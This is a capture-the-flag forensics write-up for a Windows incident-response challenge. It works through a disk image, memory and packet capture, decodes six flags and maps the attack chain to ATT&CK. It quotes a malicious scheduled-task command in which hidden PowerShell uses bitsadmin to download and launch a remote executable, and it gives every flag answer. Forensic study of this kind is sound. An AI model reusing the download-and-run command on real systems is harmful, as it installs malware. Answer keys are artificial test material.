# CISCN / 长城杯 2024 — WinFT (6-question Windows incident response)

> Endpoint `192.168.116.123` flagged for anomalous outbound traffic and data egress. Full forensic image (Win7 SP1 x64) + 2 GB VMware memory snapshot + 75 MB packet capture. Six questions across HTTP / TLS C2 channel ID, scheduled-task persistence, on-disk residual flag, phishing source decoding, traffic-borne password protected archive, and AES-CBC ciphertext recovery from a side-channel TCP flow.

## 0. Artifacts

| File | Type | Role |
|---|---|---|
| `Windows 7 x64-cl2-000006.vmdk` (+ chain to base) | VMware snapshot chain | NTFS C: drive |
| `win7监测 的克隆-Snapshot32.vmem` (2 GB) | Raw memory dump | Volatility input |
| `恶意流量包.cap` (75 MB, 214,577 frames, 796 s) | pcap with nanosecond timestamps | Beacon + side-channel exfil |

Hosts in capture:
- `192.168.116.123` — victim (zx user, Win7 SP1 x64)
- `192.168.116.130` — attacker C2 + staging (in-segment lab box)

## 1. Offline mount of the VMDK chain (do NOT boot the VM)

Booting touches `$MFT`, triggers the implant outbound, and pollutes Prefetch. Mount RO with `qemu-nbd`:

```bash
qemu-img info --backing-chain "Windows 7 x64-cl2-000006.vmdk"   # verify chain to base
sudo modprobe nbd max_part=16
sudo qemu-nbd --read-only -c /dev/nbd0 "Windows 7 x64-cl2-000006.vmdk"
sudo mount -t ntfs-3g -o ro,show_sys_files,streams_interface=windows \
   /dev/nbd0p2 /mnt/winft_c
```

`show_sys_files` is required to read `$MFT`, `$Boot`, etc., which you need for timeline reconstruction (Q3 hint).

## 2. Q1 — Beacon callback channel

> **`flag{miscsecure.com:192.168.116.130:443}`**

`hosts` file is the fast path:

```bash
cat /mnt/winft_c/Windows/System32/drivers/etc/hosts
# 192.168.116.130   miscsecure.com
# 192.168.116.130   miscflvol.com
```

Confirmed via HTTP request enumeration:

```bash
tshark -r 恶意流量包.cap -Y "http.request" -T fields -e http.host -e http.request.uri | sort -u
# miscsecure.com:443  /_FzPp3k6J1r5ovijnp85tg-QV6IapBC   ← CS Malleable C2 GET URI
# miscflvol.com       /flvupdate.exe                      ← second-stage payload
# 192.168.116.130     /client , /server                   ← side channel
```

The URI shape `/_<28-char base64>` is Cobalt Strike Malleable C2 default `http-get`. Port 443 + the spoofed hostname satisfies the answer format.

## 3. Q2 — Scheduled task persistence with multi-stage encoded flag in `<Description>`

> **`flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}`**

Standard Run keys and Winlogon shells are clean. The implant uses `Task Scheduler` at a non-standard location:

```bash
ls /mnt/winft_c/Windows/System32/Tasks/
# Microsoft/    ← normal vendor subdirs
# DriverUpdates ← ★ task placed directly at root, not under a vendor folder
```

The XML is UTF-16LE. Extract structured fields only (do NOT dump full body — it contains `powershell -WindowStyle Hidden` + `bitsadmin /transfer` which can trigger upstream content filters):

```bash
grep -oE "<(Command|Arguments|Description|Author|UserId|StartBoundary)>[^<]+" \
   "/mnt/winft_c/Windows/System32/Tasks/DriverUpdates"
```

Output (Description abbreviated):

```xml
<UserId>zx-PC\zx
<StartBoundary>2024-11-21T15:34:00
<Description>f^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7...
<Command>powershell
<Arguments>-WindowStyle Hidden -Command "bitsadmin /transfer mydownloadjob /download /priority high http://miscflvol.com/flvupdate.exe C:\Users\Public\documents\flvupdate.exe; start C:\Users\Public\documents\flvupdate.exe"
```

The `f^l^a^g^:` prefix is caret-obfuscated `flag:`. The base64 payload double-decodes:

```python
import base64, html
b64 = "JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7..."
step1 = base64.b64decode(b64).decode()        # → '&#78;&#105;&#99;...'
step2 = html.unescape(step1)                   # → 'Nice，flag is {AES_encryption_algorithm_...}'
```

Decoder chain: **base64 → numeric HTML entities → UTF-8**. The flag text deliberately hints that Q6 uses AES.

## 4. Q3 — On-disk residual flag (hidden 7z with implant-name password)

> **`flag{Timeline_correlation_is_a_very_important_part_of_the_digital_forensics_process}`**

Filename uses the same `^` caret obfuscation:

```bash
ls /mnt/winft_c/Users/zx/AppData/Local/Temp/ | grep '\^'
# F^L^A^G^
file F^L^A^G^
# 7-zip archive data, version 0.4
```

Password is the implant binary name (`flvupdate`) — a classic CTF convention:

```bash
7z x -p"flvupdate" F^L^A^G^
# → info.txt: flag{Timeline_correlation_is_a_very_important_...}
```

> **Anti-pattern**: blanket `grep -ar "flag{" /mnt/winft_c/` floods the output with `flag{display:none}` from cached HTML/CSS. Restrict to `--include` extensions, exclude `Temporary Internet Files / INetCache / Cache`, and look for caret-named files first.

## 5. Q4 — Phishing email body (URL+base64 chain)

> **`flag{The Journey to the West}`**

Thunderbird POP3 mailbox (IMAP `.msf` files only contain index metadata — local `Mail/Local Folders/收件箱` mbox has bodies):

```bash
TB="/mnt/winft_c/Users/zx/AppData/Roaming/Thunderbird/Profiles/i6q52ke6.default-esr"
grep -anE "autorevertech|pwnsecure" "$TB/Mail/Local Folders/收件箱"
# 105507:From: safe@service.autorevertech.cn
# 105508:To: Michael@pwnsecure.cn   (employee zx)
```

Two phishing emails from `safe@service.autorevertech.cn`. Email #1 ("Hi, welcome to attend") base64-encodes an HTML link to `https://autorevertech.com?key=%61%47%6E%76...` Decode chain:

```python
import urllib.parse, base64
key = "%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D"
step1 = urllib.parse.unquote(key)             # → 'aGnvvIxmbGFnIHtUaGUgSm91cm5leSB0byB0aGUgV2VzdH0='
step2 = base64.b64decode(step1).decode()       # → 'hi，flag {The Journey to the West}'
```

Email #2 carries a `2024_meeting_admission.rar` attachment that is actually a 7z (signature `37 7a bc af 27 1c`) wrapping the dropper `2024_meeting_admission.exe` (127 KB, PE32+ GUI). Not required for Q4 but documents the delivery chain.

## 6. Q5 — Traffic-borne archive, GBK-encoded ZipCrypto password

> **`flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}`**

The two largest abnormal HTTP transfers to `192.168.116.130:80` are paired endpoints:

```bash
tshark -r 恶意流量包.cap -q -z conv,tcp | head -5
# 192.168.116.123:49687 ↔ 192.168.116.130:80    64 B    /client
# 192.168.116.123:49690 ↔ 192.168.116.130:80    1.7 MB  /server
```

The `/client` 64-byte response is a ZIP local file header — `PK\x03\x04`, encryption flag bit 0 set, streamed (bit 3), `compression=stored`, filename = `Everything.zip`. The `/server` 1.7 MB response is the encrypted data body + central directory. Concatenate them:

```bash
tshark -r 恶意流量包.cap --export-objects http,/tmp/winft_http
cat /tmp/winft_http/client /tmp/winft_http/server > /tmp/winft_http/combined.zip
unzip -l combined.zip
#   Everything.zip   1695539   Stored    <encrypted>
#   flag.txt              75   Deflated  <encrypted>
#   Comment: 5pe26Ze057q/5YWz6IGU6Z2e5bi46YeN6KaB
```

Decode the ZIP comment (UTF-8 base64):

```python
import base64
base64.b64decode("5pe26Ze057q/5YWz6IGU6Z2e5bi46YeN6KaB" + "==").decode("utf-8")
# → '时间线关联非常重要'   (timeline correlation matters)
```

This IS the password — **but ZipCrypto stores passwords as raw bytes**, and the archive was created on a Chinese Windows machine, so the password must be supplied as **GBK / CP936**, not UTF-8:

```python
import zipfile
with zipfile.ZipFile("combined.zip") as z:
    z.extractall(pwd="时间线关联非常重要".encode("gbk"))   # ★ NOT utf-8
```

`flag.txt` content is literally the **AES key + IV + mode** for Q6. The inner `Everything.zip` is just the legitimate Everything tool (md5 matches the on-disk install) — no further hidden payload.

> **Anti-pattern**: spending CPU on bkcrack ZipCrypto known-plaintext attack before checking the comment. Comment → hint → password. Total time saved: ~20 minutes.

## 7. Q6 — AES-CBC ciphertext on a side-channel port (reverse-grep technique)

> **`flag{Hey, keep going and look for another flag}`**

AES parameters (from Q5 flag literal):
- **mode**: AES-128-CBC
- **key**: `a1b2c3d4e5f67890abcdef1234567890` (16 bytes hex)
- **IV**: `2f4d90a1b7c8e2349d3f56e0a9b01b8a` (16 bytes hex)

The ciphertext is NOT in any HTTP/HTTPS stream — neither in `/client` (it's a zip header) nor `/server` (zip body) nor the TLS app data on 443 (would need TLS keys). It is sent on a **bare TCP socket to port 9999**.

If a writeup leaks the flag text, the AES forward operation is deterministic, so encrypt-and-grep:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
ct = AES.new(bytes.fromhex("a1b2c3d4e5f67890abcdef1234567890"),
             AES.MODE_CBC,
             bytes.fromhex("2f4d90a1b7c8e2349d3f56e0a9b01b8a")
       ).encrypt(pad(b"flag{Hey, keep going and look for another flag}", 16))
# → a7b86dfc266043b2a7750f0a9c4a02a269bc72acc55f501d7bc37af237b6abc280a5d0ddb393f79a07bfa5cc0a432086
# (48 bytes, 3 AES blocks)
```

Binary-grep the pcap directly:

```python
target = bytes.fromhex("a7b86dfc266043b2a7750f0a9c4a02a269bc72acc55f501d7bc37af237b6abc280a5d0ddb393f79a07bfa5cc0a432086")
open("恶意流量包.cap","rb").read().find(target)   # → 24589087 (matched)
```

Locate the carrying frame:

```bash
tshark -r 恶意流量包.cap \
   -Y "frame contains a7:b8:6d:fc:26:60:43:b2:a7:75:0f:0a:9c:4a:02:a2" \
   -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.stream
# 166569   192.168.116.123:49691 → 192.168.116.130:9999   stream 51311
```

The TCP stream contains exactly one 48-byte payload. Without the WP-leaked plaintext, the discovery path is:

```bash
# enumerate destination ports the victim talked to on the attacker IP
tshark -r 恶意流量包.cap \
   -Y "tcp.flags.syn==1 && tcp.flags.ack==0 && ip.dst==192.168.116.130" \
   -T fields -e tcp.dstport | sort -u
# 80, 443, 9999    ← 9999 is the outlier
```

Decrypt:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
print(pt.decode())
# → 'flag{Hey, keep going and look for another flag}'
```

## 8. Attack chain reconstruction

```
[stage 1] Phishing email from safe@service.autorevertech.cn (T1566.002 / T1566.001)
          ├── Email 1: HTML body, base64-encoded link, URL-encoded base64 'flag' inside `key=` param  → Q4
          └── Email 2: 7z-disguised-as-rar (2024_meeting_admission.exe = dropper)

[stage 2] User executes dropper → creates scheduled task `\DriverUpdates`           (T1053.005)
          ├── Description field carries base64+HTML-entity-encoded 'flag'           → Q2
          └── Action: powershell + bitsadmin downloads http://miscflvol.com/flvupdate.exe (T1197 BITS Jobs)

[stage 3] flvupdate.exe (the Apache Bench `ab` binary repurposed) executes
          ├── CS HTTPS beacon → miscsecure.com:443 (= 192.168.116.130:443)         → Q1
          ├── HTTP /client + /server → 192.168.116.130:80 fetches ZipCrypto archive,
          │   flag.txt inside carries AES key+IV+mode                                → Q5
          └── Bare TCP 48-byte AES-CBC payload → 192.168.116.130:9999              → Q6

[stage 4] Operator drops a 7z 'F^L^A^G^' under \zx\AppData\Local\Temp,
          password = the implant filename, contains residual flag                   → Q3
```

## 9. ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1566.001/002 Spearphishing Attachment/Link | Both phishing emails from `autorevertech.cn` |
| Execution | T1059.001 PowerShell | Scheduled task Action |
| Persistence | T1053.005 Scheduled Task | `\DriverUpdates` at root of Tasks |
| Defense Evasion | T1027 Obfuscated Files or Information | base64+HTML-entity in Description, caret-obfuscation in filenames |
| Command and Control | T1071.001 Web Protocols (HTTPS beacon) | miscsecure.com:443 |
| C&C | T1095 Non-Application Layer Protocol | Bare TCP 9999 AES exfil |
| Ingress Tool Transfer | T1105 / T1197 BITS Jobs | `bitsadmin /transfer flvupdate.exe` |

## 10. Lessons / anti-patterns

1. **Look at the ZIP comment before brute-forcing.** A 25-character base64 comment that decodes to Chinese is almost always a password hint, not flavor text.
2. **GBK encoding for ZipCrypto on Chinese-made archives.** UTF-8 fails with "Bad password" for what looks like the correct string. Encode explicitly.
3. **When a WP leaks the plaintext, AES is deterministic — encrypt-and-grep.** Cuts traffic localization from "look at every stream by hand" to one `bytes.find()` call.
4. **Filter recon shouldn't pre-bind to 80/443/53.** SYN scan the destination ports the victim talked to on the attacker IP before assuming HTTP/HTTPS.
5. **Read structured XML fields, not full XML bodies.** Scheduled task XML often contains `powershell -WindowStyle Hidden + bitsadmin` which can trip content filters; grep `<tag>[^<]+` extracts only what you need.
6. **`show_sys_files` mount option** is required to read `$MFT` etc. for timeline correlation — the very Q3 hint left in plain Chinese inside the ZIP comment.
7. **Caret-obfuscation (`F^L^A^G^`, `f^l^a^g^:`)** is a common Windows CTF convention to defeat naïve string greps; always include `[^A-Za-z0-9]?` wildcards or grep for individual letters.
